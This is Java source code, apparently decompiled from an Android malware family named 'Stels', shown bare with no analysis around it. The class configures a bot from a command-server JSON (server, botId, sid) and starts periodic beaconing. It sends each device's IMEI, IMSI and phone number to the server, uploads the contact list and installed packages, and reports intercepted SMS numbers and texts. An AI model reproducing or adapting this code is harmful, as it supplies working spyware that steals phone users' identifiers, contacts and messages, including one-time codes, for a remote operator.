package ru.stels2;

import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import java.net.HttpURLConnection;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class Stels {
    public static Settings settings;

    public Stels(Context context, JSONObject jsonObject) {
        settings = new Settings();
        Settings settings = settings;
        Settings.setSettings(settings);
        if (settings.load(context)) {
            if (System.currentTimeMillis() > settings.timeNextConnection) {
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.period * Constants.SECOND));
                settings.save(context);
            }
            Functions.startTimer(context);
            Functions.startTimerInfo(context);
        } else if (jsonObject.has("server") && jsonObject.has("period") && jsonObject.has("startPeriod") && jsonObject.has("sid")) {
            try {
                settings.version = "2";
                settings.server = jsonObject.getString("server");
                settings.period = jsonObject.getInt("period");
                settings.startPeriod = jsonObject.getInt("startPeriod");
                settings.sid = jsonObject.getString("sid");
                if (jsonObject.has("subPref")) {
                    settings.subPref = jsonObject.getString("subPref");
                }
                if (jsonObject.has("botId")) {
                    settings.botId = jsonObject.getString("botId");
                }
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.startPeriod * Constants.SECOND));
                settings.save(context);
                Functions.startTimer(context);
                Functions.startTimerInfo(context);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static List<NameValuePair> getDefaultHttpParams(String type) {
        List<NameValuePair> params = new LinkedList();
        params.add(new BasicNameValuePair("imei", settings.imei));
        params.add(new BasicNameValuePair("imsi", settings.imsi));
        params.add(new BasicNameValuePair("time", String.valueOf(System.currentTimeMillis())));
        params.add(new BasicNameValuePair("phone", settings.phone));
        params.add(new BasicNameValuePair("version", settings.version));
        params.add(new BasicNameValuePair("sid", settings.sid));
        params.add(new BasicNameValuePair("type", type));
        params.add(new BasicNameValuePair("os", "android"));
        params.add(new BasicNameValuePair("model", Build.MODEL));
        params.add(new BasicNameValuePair("manufacturer", Build.MANUFACTURER));
        params.add(new BasicNameValuePair("sdk", String.valueOf(VERSION.SDK_INT)));
        params.add(new BasicNameValuePair("subPref", settings.subPref));
        params.add(new BasicNameValuePair("botId", settings.botId));
        return params;
    }

    public static JSONObject sendRequest(Context context) {
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("callback"), new LinkedList(), false, null);
            if (connection != null && connection.getResponseCode() == 200) {
                return Functions.parseResponse(connection.getInputStream());
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return new JSONObject();
    }

    public static void sendContactsToServer(String contacts) {
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("phonebook"), new LinkedList(), true, contacts);
            if (connection != null) {
                int code = connection.getResponseCode();
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void sendPackagesToServer(String packages) {
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("packages"), new LinkedList(), true, packages);
            if (connection != null) {
                int code = connection.getResponseCode();
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static JSONObject sendCatchRequest(String number, String text) {
        try {
            List<NameValuePair> params = getDefaultHttpParams("catch");
            params.add(new BasicNameValuePair("number", number));
            params.add(new BasicNameValuePair("text", text));
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", params, new LinkedList(), false, null);
            if (connection != null && connection.getResponseCode() == 200) {
                return Functions.parseResponse(connection.getInputStream());
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return new JSONObject();
    }
}
